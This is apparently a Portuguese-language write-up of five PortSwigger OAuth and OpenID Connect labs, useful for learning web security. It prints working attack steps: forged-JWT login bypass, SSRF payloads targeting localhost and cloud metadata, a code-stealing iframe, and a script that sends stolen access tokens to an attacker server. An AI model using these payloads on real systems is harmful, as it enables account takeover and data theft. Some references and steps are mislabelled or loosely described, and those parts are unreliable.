```markdown
# 📝 Meu Write-up: Resolução dos Laboratórios OAuth & OpenID Connect
**Plataforma**: PortSwigger Web Security Academy
**Total de laboratórios**: 5
**Níveis**: Apprentice / Practitioner
**Status**: ✅ Todos resolvidos

---

## 📋 Índice
1. [Authentication bypass via OAuth implicit flow](#1-authentication-bypass-via-oauth-implicit-flow)
2. [SSRF via OpenID dynamic client registration](#2-ssrf-via-openid-dynamic-client-registration)
3. [Forced OAuth profile linking](#3-forced-oauth-profile-linking)
4. [OAuth account hijacking via redirect_uri](#4-oauth-account-hijacking-via-redirect_uri)
5. [Stealing OAuth access tokens via an open redirect](#5-stealing-oauth-access-tokens-via-an-open-redirect)

---

## 1. Authentication bypass via OAuth implicit flow
**Nível**: Apprentice

### Como eu resolvi
Comecei acessando a página de login da aplicação e escolhendo a opção **"Entrar com OAuth"**. Após me autenticar com as credenciais fornecidas (`wiener:peter`), fui redirecionado de volta para o site e notei algo importante: o token de acesso aparecia diretamente na barra de endereço, na parte depois do `#`:

```
https://lab-alvo.com/callback#access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

Percebi que o token era um **JWT** e que a aplicação não fazia nenhuma validação dele — não verificava assinatura, validade ou quem era o usuário dono do token. Para testar, modifiquei o valor do campo `sub` (identificador do usuário) dentro do token e colei ele novamente na URL. Ao recarregar a página, a aplicação aceitou o token alterado e me logou como o usuário que eu havia definido. Com isso, consegui contornar a autenticação e resolver o laboratório.

### O que aprendi
O Fluxo Implícito (`response_type=token`) é inseguro quando usado de forma incorreta, pois expõe o token diretamente no navegador. Se o servidor não validar o token recebido, qualquer um pode alterá-lo e assumir outra identidade.

---

## 2. SSRF via OpenID dynamic client registration
**Nível**: Practitioner

### Como eu resolvi
Primeiro, procurei o endpoint de registro dinâmico de clientes do OpenID Connect, que é uma funcionalidade padrão da especificação. Encontrei que ele aceitava requisições `POST` com dados em formato JSON:

```http
POST /openid/register
Content-Type: application/json
```

A documentação mostrava que podíamos enviar campos como `logo_uri`, `policy_uri` ou `tos_uri`, que são URLs que o servidor deveria acessar para carregar recursos. Testei enviar uma requisição com um endereço interno da própria máquina:

```json
{
  "client_name": "Meu Teste",
  "redirect_uris": ["https://meu-site.com/callback"],
  "logo_uri": "http://127.0.0.1/admin"
}
```

A resposta do servidor demorou mais um pouco e retornou uma mensagem que indicava que ele havia tentado acessar esse endereço. Confirmei o SSRF testando também outros destinos:
- `http://localhost`
- `http://169.254.169.254` (serviço de metadados da nuvem)

Como o servidor acessou esses endereços sem restrição, confirmei a vulnerabilidade e concluí o laboratório.

### O que aprendi
O registro dinâmico pode ser perigoso se não houver filtros: ao permitir o envio de URLs, o atacante pode fazer com que o servidor acesse serviços internos e restritos, o que é um ataque do tipo **SSRF**.

---

## 3. Forced OAuth profile linking
**Nível**: Practitioner

### Como eu resolvi
Primeiro, criei minha conta na aplicação e iniciei o processo de vinculação com minha conta OAuth. Observei a URL gerada no início do fluxo:

```
GET /oauth/link?client_id=123&redirect_uri=https://lab-alvo.com/callback&state=ABC123
```

Notei que o parâmetro `state` tinha um valor fixo e não mudava a cada requisição, nem estava associado à minha sessão. Esse parâmetro serve exatamente para evitar manipulações, mas aqui ele estava mal implementado.

Então montei um link completo com os mesmos parâmetros e enviei para a vítima. Quando ela acessou esse link já estando logada em sua própria conta, a aplicação completou a vinculação automaticamente, associando a conta dela à minha conta OAuth. Depois disso, bastou eu fazer login com minhas credenciais OAuth para ser direcionado diretamente para a conta da vítima — resolvendo o desafio.

### O que aprendi
O parâmetro `state` deve ser único, aleatório e ligado à sessão do usuário. Quando ele é fraco ou ausente, é possível forçar a vinculação de contas e assumir o acesso de outras pessoas.

---

## 4. OAuth account hijacking via redirect_uri
**Nível**: Practitioner

### Como eu resolvi
Comecei logando com `wiener:peter` e, usando o Burp Suite, capturei a requisição inicial de autorização:

```
GET /auth?client_id=CLIENTE-LAB&redirect_uri=https://lab-alvo.com/oauth-callback&response_type=code&scope=openid%20profile%20email
```

Enviei essa requisição para o **Repeater** e alterei o valor do `redirect_uri` para o endereço do meu servidor de exploração:

```
redirect_uri=https://meu-servidor.exploit-server.net
```

Enviei a requisição e percebi que o servidor OAuth aceitou normalmente, sem nenhuma mensagem de erro. Isso significava que ele não verificava se o destino era confiável.

Criei então um exploit simples com um iframe para enviar para o administrador:

```html
<iframe src="https://oauth-servidor.net/auth?client_id=CLIENTE-LAB&redirect_uri=https://meu-servidor.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

Quando o admin abriu a página, ele já tinha uma sessão ativa no servidor OAuth, então a autorização aconteceu automaticamente e o código de autorização foi enviado para o meu servidor. Copiei esse código dos logs e acessei:

```
https://lab-alvo.com/oauth-callback?code=CODIGO_QUE_ROUBEI
```

Fui logado como administrador, entrei no painel e excluí o usuário `carlos` — finalizando o laboratório.

### O que aprendi
O `redirect_uri` deve ser rigorosamente validado e estar em uma lista de endereços permitidos. Se aceitar qualquer destino, o atacante pode interceptar códigos de autorização e roubar contas.

---

## 5. Stealing OAuth access tokens via an open redirect
**Nível**: Practitioner

### Como eu resolvi
Nesse laboratório, o `redirect_uri` tinha uma validação parcial: não aceitava domínios externos diretamente, mas permitia usar a sequência `../` para percorrer caminhos. Testei alterando a requisição para:

```
redirect_uri=https://lab-alvo.com/oauth-callback/../post?postId=1
```

Funcionou: fui redirecionado para o artigo do blog, o que confirmou a falha de validação. Depois, procurei por outras funcionalidades e encontrei a página `/post/next`, que tinha um parâmetro `path` e funcionava como um **redirecionamento aberto**: aceitava qualquer URL para onde me redirecionar.

Juntei as duas falhas em uma única requisição:

```
https://oauth-servidor.net/auth?client_id=CLIENTE-LAB&redirect_uri=https://lab-alvo.com/oauth-callback/../post/next?path=https://meu-servidor.exploit-server.net/exploit&response_type=token&scope=openid%20profile%20email
```

No meu servidor, adicionei um pequeno script para capturar o token, que vinha na parte `#` da URL:

```html
<script>
  if (!location.hash) {
    location.href = "URL_MALICIOSA_ACIMA";
  } else {
    location.href = "/?" + location.hash.substr(1);
  }
</script>
```

Enviei o link para o administrador. Quando ele acessou, o fluxo o redirecionou automaticamente até o meu servidor, e o token apareceu nos logs. Com ele, fiz uma requisição para o endpoint `/me` usando o cabeçalho:

```
Authorization: Bearer TOKEN_QUE_ROUBEI
```

Recebi a resposta com todos os dados do administrador, incluindo a chave de API. Enviei essa chave no campo de solução e finalizei o laboratório.

### O que aprendi
Mesmo que o `redirect_uri` seja validado, falhas como travessia de caminho ou redirecionamentos abertos na mesma aplicação podem ser usadas para contornar essas regras e roubar tokens de acesso.

---

## 📚 Referências usadas
- [OAuth 2.0 Authorization Framework (RFC 6749)](https://datatracker.ietf.org/doc/html/rfc6749)
- [OAuth 2.0 Security Best Current Practice (RFC 6819)](https://datatracker.ietf.org/doc/html/rfc6819)
- [OpenID Connect Core 1.0](https://openid.net/specs/openid-connect-core-1_0.html)
- [PortSwigger Web Security Academy - OAuth](https://portswigger.net/web-security/oauth)
```

---

